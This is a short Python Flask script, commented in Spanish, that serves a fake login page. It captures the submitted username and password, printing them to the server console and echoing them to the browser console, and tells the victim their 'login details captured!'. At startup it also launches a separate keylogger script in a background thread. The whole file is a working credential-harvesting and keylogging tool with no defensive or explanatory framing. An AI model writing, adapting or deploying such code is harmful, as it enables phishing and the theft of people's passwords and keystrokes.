from flask import Flask, request, render_template_string
import subprocess
import threading

app = Flask(__name__)

# Contenido del HTML
html_content = '''
<!DOCTYPE html>
<html>
<head>
    <title>Login Form</title>
</head>
<body>
    <h2>Login Page</h2>
    <form action="/login" method="POST" id="loginForm">
        <label for="username">Username:</label><br>
        <input type="text" id="username" name="username"><br>
        <label for="password">Password:</label><br>
        <input type="password" id="password" name="password"><br><br>
        <input type="submit" value="Login">
    </form>

    <script>
        document.getElementById('loginForm').onsubmit = function() {
            var username = document.getElementById('username').value;
            var password = document.getElementById('password').value;
            console.log('Username: ' + username);
            console.log('Password: ' + password);
        }
    </script>
</body>
</html>
'''

@app.route('/')
def index():
    return render_template_string(html_content)

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    print(f'Captured Username: {username}')
    print(f'Captured Password: {password}')
    return "Login details captured! Check the console."

def run_keylogger():
    subprocess.run(["python", "keylogger.py"])

if __name__ == '__main__':
    # Ejecuta el keylogger en un hilo separado
    threading.Thread(target=run_keylogger).start()
    app.run(debug=True)
